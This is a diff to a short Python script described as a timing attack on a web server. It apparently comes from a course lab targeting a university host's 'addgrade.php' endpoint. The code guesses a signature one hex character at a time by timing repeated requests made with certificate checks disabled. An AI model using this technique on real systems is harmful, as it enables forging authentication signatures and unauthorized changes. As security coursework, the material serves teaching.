@@ -3,7 +3,9 @@ import timeit
 import requests
 import ssl
 import urllib
-
+"""
+A timing attack on a webserver, gets the signature of a chosen target
+"""
 def webattack(name, grade):
     signa = list('xxxxxxxxxxxxxxxxxxxx')
     out = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name="
@@ -16,7 +18,8 @@ def webattack(name, grade):
         for i in range(16):
             signa[j] = str(hex(i))[2:]
             newOut = out + "".join(signa)
-            t = timeit.timeit(lambda : urllib.request.urlopen(newOut, context = ssl._create_unverified_context()), number=10)
+            t = timeit.timeit(lambda : urllib.request.urlopen(newOut,
+                    context = ssl._create_unverified_context()), number=10)
 
             if t > oldT:
                 oldT = t
